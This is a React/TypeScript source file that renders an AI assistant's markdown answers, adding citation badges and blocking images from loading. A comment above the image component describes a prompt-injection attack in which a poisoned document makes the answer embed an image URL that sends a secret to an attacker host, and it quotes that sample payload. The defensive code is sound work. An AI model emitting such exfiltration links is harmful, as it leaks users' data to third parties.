/**
 * react-markdown component overrides for assistant answers: inline [N]
 * citation badges, styled tables/code, links opening in a new tab, and
 * images rendered as links instead of being loaded.
 */
import * as React from "react";
import Paper from "@mui/material/Paper";
import Popper from "@mui/material/Popper";
import Fade from "@mui/material/Fade";
import Typography from "@mui/material/Typography";
import DescriptionOutlinedIcon from "@mui/icons-material/DescriptionOutlined";
import TableChartOutlinedIcon from "@mui/icons-material/TableChartOutlined";
import ImageNotSupportedOutlinedIcon from "@mui/icons-material/ImageNotSupportedOutlined";
import type { Components } from "react-markdown";
import styles from "../../styles/chat.module.scss";
import { displayPage, type SourceItem } from "./chat-sources";

const EXCERPT_PREVIEW_CHARS = 200;

function CitedIndicator() {
  return (
    <span className={`${styles.relevancePill} ${styles.relevanceCited}`}>
      <span className={styles.relevanceDot} />
      Cited in response
    </span>
  );
}

function CitationBadge({
  source,
  onCitationClick,
}: {
  source: SourceItem;
  onCitationClick?: (chunkIndex: number) => void;
}) {
  const [anchorEl, setAnchorEl] = React.useState<HTMLElement | null>(null);
  const clickable = source.chunkIndex != null && Boolean(onCitationClick);

  const handleClick = () => {
    if (source.chunkIndex != null && onCitationClick) {
      onCitationClick(source.chunkIndex);
    }
  };

  return (
    <>
      <button
        type="button"
        className={styles.citationBadge}
        onMouseEnter={(e) => setAnchorEl(e.currentTarget)}
        onMouseLeave={() => setAnchorEl(null)}
        onFocus={(e) => setAnchorEl(e.currentTarget)}
        onBlur={() => setAnchorEl(null)}
        onClick={handleClick}
        aria-label={`Source ${source.chunkIndex}: ${source.title}`}
      >
        {source.chunkIndex}
      </button>
      <Popper open={Boolean(anchorEl)} anchorEl={anchorEl} placement="top" transition style={{ zIndex: 1300 }}>
        {({ TransitionProps }) => (
          <Fade {...TransitionProps} timeout={150}>
            <Paper className={styles.citationCard} elevation={8}>
              <div className={styles.citationCardHeader}>
                {source.sourceType === "excelIndex" ? (
                  <TableChartOutlinedIcon sx={{ fontSize: 14, color: "text.secondary", flexShrink: 0 }} />
                ) : (
                  <DescriptionOutlinedIcon sx={{ fontSize: 14, color: "text.secondary", flexShrink: 0 }} />
                )}
                <Typography variant="subtitle2" className={styles.citationCardTitle} noWrap>
                  {source.title}
                </Typography>
              </div>
              <div className={styles.citationCardMeta}>
                {source.cited && <CitedIndicator />}
                {source.page != null && source.cited && <span className={styles.metaDivider}>·</span>}
                {source.page != null && (
                  <Typography variant="caption" sx={{ fontSize: "0.6875rem", color: "text.secondary" }}>
                    Page {displayPage(source.page)}
                  </Typography>
                )}
              </div>
              {source.excerpt && (
                <Typography variant="body2" className={styles.citationExcerpt}>
                  {source.excerpt.length > EXCERPT_PREVIEW_CHARS
                    ? source.excerpt.slice(0, EXCERPT_PREVIEW_CHARS) + "..."
                    : source.excerpt}
                </Typography>
              )}
              {clickable && (
                <Typography
                  variant="caption"
                  sx={{ color: "primary.main", mt: 0.5, display: "block", fontSize: "0.6875rem" }}
                >
                  Click to view source
                </Typography>
              )}
            </Paper>
          </Fade>
        )}
      </Popper>
    </>
  );
}

type ChildProps = { children?: React.ReactNode };

function renderWithCitations(
  children: React.ReactNode,
  sources: SourceItem[],
  onCitationClick?: (chunkIndex: number) => void,
  keyPrefix = "cit"
): React.ReactNode {
  if (typeof children === "string") {
    const parts = children.split(/(\[\d+\])/g);
    if (parts.length === 1) return children;
    return parts.map((part, i) => {
      const match = part.match(/^\[(\d+)\]$/);
      if (!match) return part;
      const source = sources.find((s) => s.chunkIndex === parseInt(match[1], 10));
      // A source that was filtered out (e.g. metadata.txt) hides its dangling [N].
      return source ? (
        <CitationBadge key={`${keyPrefix}-${i}`} source={source} onCitationClick={onCitationClick} />
      ) : null;
    });
  }
  if (Array.isArray(children)) {
    return children.map((child, i) =>
      renderWithCitations(child, sources, onCitationClick, `${keyPrefix}-${i}`)
    );
  }
  if (React.isValidElement<ChildProps>(children) && children.props.children) {
    return React.cloneElement(
      children,
      { key: children.key ?? `${keyPrefix}-el` },
      renderWithCitations(children.props.children, sources, onCitationClick, `${keyPrefix}-ch`)
    );
  }
  return children;
}

/**
 * Never load images from model output: a prompt-injected document could make
 * the answer include `![](https://attacker/?q=<secret>)` and the browser would
 * leak data just by rendering it. Show a link the user can choose to open.
 */
function MarkdownImage({ src, alt }: { src?: string; alt?: string }) {
  const label = alt?.trim() || "image";
  const isWebUrl = typeof src === "string" && /^https?:\/\//i.test(src);
  return (
    <span className={styles.blockedImage}>
      <ImageNotSupportedOutlinedIcon sx={{ fontSize: 14, verticalAlign: "-2px", mr: 0.5 }} aria-hidden="true" />
      {isWebUrl ? (
        <a href={src} target="_blank" rel="noopener noreferrer nofollow">
          {label} (external image, not loaded)
        </a>
      ) : (
        <span>{label} (image not shown)</span>
      )}
    </span>
  );
}

type MdProps<T extends keyof JSX.IntrinsicElements> = JSX.IntrinsicElements[T] & {
  node?: unknown;
};

export function buildMarkdownComponents(
  sources: SourceItem[],
  onCitationClick?: (chunkIndex: number) => void
): Components {
  const cite = (children: React.ReactNode) => renderWithCitations(children, sources, onCitationClick);
  const wrap = <T extends keyof JSX.IntrinsicElements>(Tag: T) =>
    function Wrapped({ children, node: _node, ...rest }: MdProps<T>) {
      return React.createElement(Tag, rest, cite(children as React.ReactNode));
    };

  return {
    p: wrap("p"),
    li: wrap("li"),
    h1: wrap("h1"),
    h2: wrap("h2"),
    h3: wrap("h3"),
    h4: wrap("h4"),
    h5: wrap("h5"),
    h6: wrap("h6"),
    strong: wrap("strong"),
    em: wrap("em"),
    td: ({ children, node: _node, ...rest }: MdProps<"td">) => (
      <td {...rest} className={styles.markdownTableCell}>
        {cite(children)}
      </td>
    ),
    th: ({ children, node: _node, ...rest }: MdProps<"th">) => (
      <th {...rest} className={styles.markdownTableCell}>
        {cite(children)}
      </th>
    ),
    pre: ({ children, node: _node, ...rest }: MdProps<"pre">) => (
      <pre {...rest} className={styles.codeMarkdown}>
        {children}
      </pre>
    ),
    table: ({ children, node: _node, ...rest }: MdProps<"table">) => (
      <table {...rest} className={styles.markdownTable}>
        {children}
      </table>
    ),
    a: ({ children, href, node: _node, ...rest }: MdProps<"a">) => (
      <a {...rest} href={href} target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    ),
    img: ({ src, alt }: MdProps<"img">) => <MarkdownImage src={src} alt={alt} />,
  };
}
